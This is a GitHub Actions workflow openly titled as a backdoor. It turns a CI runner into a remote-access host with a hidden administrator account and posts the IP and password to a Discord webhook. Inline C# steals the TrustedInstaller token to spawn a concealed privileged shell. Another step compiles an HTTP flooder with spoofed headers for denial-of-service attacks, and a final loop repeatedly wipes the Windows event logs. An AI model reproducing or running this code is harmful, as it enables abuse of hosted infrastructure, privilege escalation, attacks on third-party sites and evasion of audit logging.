name: RDP + TrustedInstaller Backdoor

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Enable RDP + Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 2. Create Hidden Admin Account
        run: |
          $secpass = ConvertTo-SecureString "Hex0#2026" -AsPlainText -Force
          New-LocalUser -Name "Hex0" -Password $secpass -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "Hex0"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0"
          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f

      - name: 3. Install Tailscale & Exfil IP (via Discord optional)
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
          DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp"
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          Write-Host "IP: $ts_ip"
          Write-Host "User: Hex0"
          Write-Host "Pass: Hex0#2026"
          if ($Env:DISCORD_WEBHOOK) {
            $body = @{ content = "IP: $ts_ip`nUser: Hex0`nPass: Hex0#2026" } | ConvertTo-Json
            Invoke-RestMethod -Uri $Env:DISCORD_WEBHOOK -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
          }
          Remove-Item "C:\tailscale.msi" -Force

      - name: 4. Steal TrustedInstaller Token & Spawn Hidden TI Shell
        run: |
          # Inline C# to duplicate TrustedInstaller token and spawn cmd.exe
          Add-Type -TypeDefinition @"
          using System;
          using System.Runtime.InteropServices;
          using System.Diagnostics;

          public class TI
          {
              [DllImport("kernel32.dll")]
              public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

              [DllImport("advapi32.dll", SetLastError = true)]
              public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

              [DllImport("advapi32.dll", SetLastError = true)]
              public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

              [DllImport("advapi32.dll", SetLastError = true)]
              public static extern bool CreateProcessAsUser(
                  IntPtr hToken,
                  string lpApplicationName,
                  string lpCommandLine,
                  IntPtr lpProcessAttributes,
                  IntPtr lpThreadAttributes,
                  bool bInheritHandles,
                  uint dwCreationFlags,
                  IntPtr lpEnvironment,
                  string lpCurrentDirectory,
                  ref STARTUPINFO lpStartupInfo,
                  out PROCESS_INFORMATION lpProcessInformation
              );

              [StructLayout(LayoutKind.Sequential)]
              public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

              [StructLayout(LayoutKind.Sequential)]
              public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

              public static void Spawn()
              {
                  Process[] procs = Process.GetProcessesByName("TrustedInstaller");
                  if (procs.Length == 0) throw new Exception("TrustedInstaller not running!");
                  uint pid = (uint)procs[0].Id;

                  IntPtr hProc = OpenProcess(0x0400, false, pid);
                  if (hProc == IntPtr.Zero) throw new Exception("OpenProcess failed.");

                  IntPtr hToken;
                  if (!OpenProcessToken(hProc, 0x0002 | 0x0008, out hToken)) throw new Exception("OpenProcessToken failed.");

                  IntPtr hDupToken;
                  if (!DuplicateTokenEx(hToken, 0x1F0FFF, IntPtr.Zero, 2, 1, out hDupToken)) throw new Exception("DuplicateTokenEx failed.");

                  STARTUPINFO si = new STARTUPINFO();
                  si.cb = Marshal.SizeOf(si);
                  PROCESS_INFORMATION pi;
                  uint flags = 0x08000000; // CREATE_NO_WINDOW

                  // Spawn cmd.exe as TrustedInstaller, keep it running indefinitely
                  string cmdLine = "/c whoami > C:\\ti_proof.txt & echo TrustedInstaller shell active >> C:\\ti_proof.txt & cmd.exe /k";  // /k keeps it open
                  bool success = CreateProcessAsUser(
                      hDupToken,
                      "C:\\Windows\\System32\\cmd.exe",
                      cmdLine,
                      IntPtr.Zero,
                      IntPtr.Zero,
                      false,
                      flags,
                      IntPtr.Zero,
                      null,
                      ref si,
                      out pi
                  );
                  if (!success) throw new Exception("CreateProcessAsUser failed.");
              }
          }
          "@ -ReferencedAssemblies "System.Diagnostics"

          # Execute the token steal
          try {
              [TI]::Spawn()
              Write-Host "[+] TrustedInstaller shell spawned. Check C:\ti_proof.txt"
          } catch {
              Write-Host "[-] Failed: $_"
          }

      - name: 5. Pre-stage DDoS Tool (HTTP Flooder) as TI Shell Helper
        run: |
          # Write a C# multi-threaded HTTP flooder that can be run from the TI shell
          @"
          using System;
          using System.Net;
          using System.Threading;
          using System.Collections.Generic;
          class Flooder {
              static void Main(string[] args) {
                  if (args.Length < 1) return;
                  string url = args[0];
                  int threads = args.Length > 1 ? int.Parse(args[1]) : 100;
                  int rate = args.Length > 2 ? int.Parse(args[2]) : 200;
                  var rand = new Random();
                  var tasks = new List<Thread>();
                  for (int i = 0; i < threads; i++) {
                      var t = new Thread(() => {
                          while (true) {
                              try {
                                  using (var wc = new WebClient()) {
                                      wc.Headers.Add("User-Agent", $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand.Next(90,120)}.0.0.0 Safari/537.36");
                                      wc.Headers.Add("X-Forwarded-For", $"{rand.Next(1,255)}.{rand.Next(1,255)}.{rand.Next(1,255)}.{rand.Next(1,255)}");
                                      wc.DownloadString(url);
                                  }
                              } catch { }
                              Thread.Sleep(1000 / rate);
                          }
                      });
                      t.IsBackground = true;
                      t.Start();
                      tasks.Add(t);
                  }
                  Console.WriteLine($"Flooding {url} with {threads} threads at rate {rate}/s");
                  Thread.Sleep(Timeout.Infinite);
              }
          }
          "@ | Out-File -FilePath "C:\Windows\Temp\flooder.cs" -Encoding ASCII

          # Compile it (so it's ready)
          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\flooder.exe C:\Windows\Temp\flooder.cs

      - name: 6. Keep Alive & Wipe Logs (6 hours)
        run: |
          for ($i = 1; $i -le 360; $i++) {
            Start-Sleep -Seconds 60
            if ($i % 30 -eq 0) {
              wevtutil cl Security -ErrorAction SilentlyContinue
              wevtutil cl System -ErrorAction SilentlyContinue
              wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" -ErrorAction SilentlyContinue
            }
          }
